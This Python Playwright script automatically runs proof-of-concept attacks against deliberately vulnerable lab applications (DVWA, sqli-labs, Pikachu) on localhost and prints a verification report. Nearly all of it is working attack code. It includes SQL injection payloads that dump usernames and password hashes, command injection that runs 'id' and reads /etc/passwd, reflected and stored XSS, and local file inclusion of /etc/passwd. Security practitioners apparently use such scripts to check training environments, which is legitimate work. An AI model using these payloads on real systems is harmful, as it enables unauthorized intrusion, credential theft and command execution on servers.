from playwright.sync_api import sync_playwright
import urllib.parse

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    results = {}

    # =========================================================
    # DVWA
    # =========================================================
    print("=" * 60)
    print("DVWA PoC Verification")
    print("=" * 60)
    page = browser.new_page()
    page.goto('http://localhost:8080/login.php')
    page.wait_for_load_state('networkidle')
    page.fill('input[name="username"]', 'admin')
    page.fill('input[name="password"]', 'password')
    page.click('input[name="Login"]')
    page.wait_for_load_state('networkidle')
    print(f'  Login: {page.url}')

    dvwa = {}
    tests = [
        ("SQLi OR 1=1", "sqli", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/sqli/'),
            page.wait_for_load_state('networkidle'),
            page.fill('input[name="id"]', "1' OR 1=1 -- "),
            page.click('input[name="Submit"]'),
            page.wait_for_load_state('networkidle'),
            'admin' in page.content() and 'First name' in page.content()
        )[-1]),
        ("SQLi UNION", "sqli", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/sqli/'),
            page.wait_for_load_state('networkidle'),
            page.fill('input[name="id"]', "1' UNION SELECT user,password FROM users-- "),
            page.click('input[name="Submit"]'),
            page.wait_for_load_state('networkidle'),
            '5f4dcc3b' in page.content() or 'Surname' in page.content()
        )[-1]),
        ("Cmdi ;id", "shell", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/exec/'),
            page.wait_for_load_state('networkidle'),
            page.fill('input[name="ip"]', '127.0.0.1; id'),
            page.click('input[name="Submit"]'),
            page.wait_for_load_state('networkidle'),
            'uid=' in page.content() and 'www-data' in page.content()
        )[-1]),
        ("Cmdi /etc/passwd", "shell", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/exec/'),
            page.wait_for_load_state('networkidle'),
            page.fill('input[name="ip"]', '127.0.0.1; cat /etc/passwd'),
            page.click('input[name="Submit"]'),
            page.wait_for_load_state('networkidle'),
            'root:x:0:0' in page.content()
        )[-1]),
        ("XSS <script>", "xss", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/xss_r/'),
            page.wait_for_load_state('networkidle'),
            page.fill('input[name="name"]', '<script>alert(1)</script>'),
            page.click('input[type="submit"]'),
            page.wait_for_load_state('networkidle'),
            '<script>' in page.content().lower()
        )[-1]),
        ("XSS <img onerror>", "xss", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/xss_r/'),
            page.wait_for_load_state('networkidle'),
            page.fill('input[name="name"]', '<img src=x onerror=alert(1)>'),
            page.click('input[type="submit"]'),
            page.wait_for_load_state('networkidle'),
            'onerror' in page.content()
        )[-1]),
        ("LFI file://", "file_include", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/fi/?page=file:///etc/passwd'),
            page.wait_for_load_state('networkidle'),
            'root:x:0:0' in page.content() or 'bin/bash' in page.content()
        )[-1]),
        ("XSS Stored", "xss", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/xss_s/'),
            page.wait_for_load_state('networkidle'),
            page.fill('input[name="txtName"]', 'testxss'),
            page.fill('textarea[name="mtxMessage"]', '<b>XSS_TEST_' + str(hash('xss')) + '</b>'),
            page.click('input[name="btnSign"]'),
            page.wait_for_load_state('networkidle'),
            'XSS_TEST_' in page.content()
        )[-1]),
        ("Upload", "file_write", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/upload/'),
            page.wait_for_load_state('networkidle'),
            page.locator('input[type="file"]').count() > 0
        )[-1]),
        ("CSRF", "trustbound", lambda: (
            page.goto('http://localhost:8080/vulnerabilities/csrf/'),
            page.wait_for_load_state('networkidle'),
            page.locator('input[name="password_new"]').count() > 0
        )[-1]),
    ]

    for name, vuln_type, fn in tests:
        try:
            ok = fn()
            dvwa[name] = ok
            print(f"  {'✓' if ok else '✗'} {name:<24} [{vuln_type}]")
        except Exception as e:
            dvwa[name] = False
            print(f"  ✗ {name:<24} ERROR: {e}")
    results['DVWA'] = dvwa

    # =========================================================
    # sqli-labs
    # =========================================================
    print("\n" + "=" * 60)
    print("sqli-labs PoC Verification")
    print("=" * 60)
    sqlilabs = {}

    get_tests = [
        (1, "1' OR 1=1--+", "String error"),
        (2, "1 OR 1=1", "Numeric"),
        (3, "1') OR 1=1--+", "Parenthesis"),
        (5, "1' OR 1=1--+", "Double query"),
        (6, '1" OR 1=1--+', "Double quote"),
    ]
    for less, payload, desc in get_tests:
        try:
            url = f'http://localhost:8082/Less-{less}/?id={urllib.parse.quote(payload, safe="")}'
            page.goto(url)
            page.wait_for_load_state('networkidle')
            body = page.content()
            ok = 'Dumb' in body or 'Your Login name' in body
            sqlilabs[f'Less-{less} {desc}'] = ok
            print(f"  {'✓' if ok else '✗'} Less-{less} [{desc}]")
        except Exception as e:
            sqlilabs[f'Less-{less} {desc}'] = False
            print(f"  ✗ Less-{less} ERROR: {e}")

    # Less-11 POST
    try:
        page.goto('http://localhost:8082/Less-11/')
        page.wait_for_load_state('networkidle')
        page.fill('input[name="uname"]', "admin' OR 1=1 -- ")
        page.fill('input[name="passwd"]', "anything")
        page.click('input[type="submit"]')
        page.wait_for_load_state('networkidle')
        body = page.content()
        ok = 'Your Login name' in body or 'Dumb' in body or 'slap' in body.lower()
        sqlilabs['Less-11 POST'] = ok
        print(f"  {'✓' if ok else '✗'} Less-11 [POST SQLi]")
    except Exception as e:
        sqlilabs['Less-11 POST'] = False
        print(f"  ✗ Less-11 ERROR: {e}")

    results['sqli-labs'] = sqlilabs

    # =========================================================
    # Pikachu
    # =========================================================
    print("\n" + "=" * 60)
    print("Pikachu PoC Verification")
    print("=" * 60)
    pikachu = {}

    # SQLi numeric - use GET parameter directly
    try:
        page.goto('http://localhost:8083/vul/sqli/sqli_id.php?submit=submit&id=1+OR+1%3D1')
        page.wait_for_load_state('networkidle')
        body = page.content()
        ok = 'admin' in body.lower() or 'lucy' in body.lower()
        pikachu['SQLi numeric'] = ok
        print(f"  {'✓' if ok else '✗'} SQLi numeric (GET)")
    except Exception as e:
        pikachu['SQLi numeric'] = False
        print(f"  ✗ SQLi numeric ERROR: {e}")

    # SQLi string
    try:
        page.goto('http://localhost:8083/vul/sqli/sqli_str.php')
        page.wait_for_load_state('networkidle')
        page.fill('input[name="name"]', "test' OR 1=1 -- ")
        page.locator('input[type="submit"]').first.click()
        page.wait_for_load_state('networkidle')
        body = page.content()
        ok = 'admin' in body.lower() or 'lucy' in body.lower()
        pikachu['SQLi string'] = ok
        print(f"  {'✓' if ok else '✗'} SQLi string")
    except Exception as e:
        pikachu['SQLi string'] = False
        print(f"  ✗ SQLi string ERROR: {e}")

    # XSS reflected
    try:
        page.goto('http://localhost:8083/vul/xss/xss_reflected_get.php')
        page.wait_for_load_state('networkidle')
        page.fill('input[name="message"]', '<script>alert(1)</script>')
        page.locator('input[type="submit"]').first.click()
        page.wait_for_load_state('networkidle')
        body = page.content()
        ok = '<script>' in body.lower()
        pikachu['XSS reflected'] = ok
        print(f"  {'✓' if ok else '✗'} XSS reflected")
    except Exception as e:
        pikachu['XSS reflected'] = False
        print(f"  ✗ XSS reflected ERROR: {e}")

    # RCE ping
    try:
        page.goto('http://localhost:8083/vul/rce/rce_ping.php')
        page.wait_for_load_state('networkidle')
        page.fill('input[name="ipaddress"]', '127.0.0.1;id')
        page.locator('input[type="submit"]').first.click()
        page.wait_for_load_state('networkidle')
        body = page.content()
        ok = 'uid=' in body
        pikachu['RCE ping'] = ok
        print(f"  {'✓' if ok else '✗'} RCE ping")
    except Exception as e:
        pikachu['RCE ping'] = False
        print(f"  ✗ RCE ping ERROR: {e}")

    # LFI
    try:
        page.goto('http://localhost:8083/vul/fil/include.php?filename=../../../../etc/passwd')
        page.wait_for_load_state('networkidle')
        body = page.content()
        ok = 'root:x:0:0' in body or 'bin/bash' in body
        pikachu['LFI'] = ok
        print(f"  {'✓' if ok else '✗'} LFI file inclusion")
    except Exception as e:
        pikachu['LFI'] = False
        print(f"  ✗ LFI ERROR: {e}")

    # XSS stored
    try:
        page.goto('http://localhost:8083/vul/xss/xss_stored.php')
        page.wait_for_load_state('networkidle')
        ta = page.locator('textarea')
        if ta.count() > 0:
            ta.first.fill('<b>XSS_STORED_TEST</b>')
            page.locator('input[type="submit"]').first.click()
            page.wait_for_load_state('networkidle')
            body = page.content()
            ok = 'XSS_STORED_TEST' in body
        else:
            ok = False
        pikachu['XSS stored'] = ok
        print(f"  {'✓' if ok else '✗'} XSS stored")
    except Exception as e:
        pikachu['XSS stored'] = False
        print(f"  ✗ XSS stored ERROR: {e}")

    results['Pikachu'] = pikachu

    browser.close()

    # =========================================================
    # SUMMARY
    # =========================================================
    print("\n" + "=" * 60)
    print("               VULNERABILITY VERIFICATION REPORT")
    print("=" * 60)

    grand_v = grand_f = 0
    for target, res in results.items():
        v = sum(1 for x in res.values() if x)
        f = sum(1 for x in res.values() if not x)
        grand_v += v
        grand_f += f
        rate = v / (v + f) * 100 if (v + f) > 0 else 0
        print(f"\n  [{target}] {v}/{v+f} verified ({rate:.0f}%)")
        for name, ok in res.items():
            print(f"    {'✓' if ok else '✗'} {name}")

    total = grand_v + grand_f
    print(f"\n{'='*60}")
    print(f"  TOTAL: {grand_v}/{total} verified ({grand_v/total*100:.0f}%)")
    print(f"{'='*60}")
